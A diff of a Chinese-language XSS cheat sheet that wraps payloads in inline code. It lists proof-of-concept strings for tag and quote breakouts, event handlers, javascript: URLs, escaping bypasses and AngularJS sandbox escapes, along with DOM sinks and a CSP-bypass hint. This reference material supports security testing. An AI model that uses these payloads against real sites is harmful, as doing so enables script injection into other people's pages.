@@ -1,20 +1,20 @@
 ⚠️要么闭合标签，要么闭合引号⚠️  
 
 ## 常用POC:
-- "><script>alert(1)</script>
-- <img src=1 onerror=alert(1)>
-- " autofocus onfocus=alert(1) x="
-- <a href="javascript:alert(1)">
-- javascript:alert(1);  
+- `"><script>alert(1)</script>`  
+- `<img src=1 onerror=alert(1)>`  
+- `" autofocus onfocus=alert(1) x="`  
+- `<a href="javascript:alert(1)">`  
+- `javascript:alert(1);`  
 伪协议
-- "><svg onload=alert(1)>
-- <span title="" onmouseover="alert(/XSS/)">" onmouseover="alert(/XSS/)</span>
-- '-alert(1)-'  
+- `"><svg onload=alert(1)>`  
+- `<span title="" onmouseover="alert(/XSS/)">" onmouseover="alert(/XSS/)</span>`  
+- `'-alert(1)-'`  
 单引号作用：跳出前一个js
 
 ## 编码绕过POC：
-- &apos;-alert(1)-&apos;  
-- ';alert(1)//
+- `&apos;-alert(1)-&apos;`  
+- `';alert(1)//`
 - 当单引号被转义时  
 ` \\';alert(1)// `
 - 有引号处理文字时,如：var input='payload';  
@@ -42,9 +42,9 @@
 `document.write、location.search、eval（）、location、someDOMElement.innerHTML/uterHTML/insertAdjacentHTML/onevent`
 
 ## 沙箱逃逸
-- toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
-- <input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1],alert)'">
-- {{$on.constructor('alert(1)')()}}
+- `toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1`
+- `<input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1],alert)'">`
+- `{{$on.constructor('alert(1)')()}}`
 
 ## 绕过CSP
 - 悬空标记注入，指定url地址后面用？跟参数
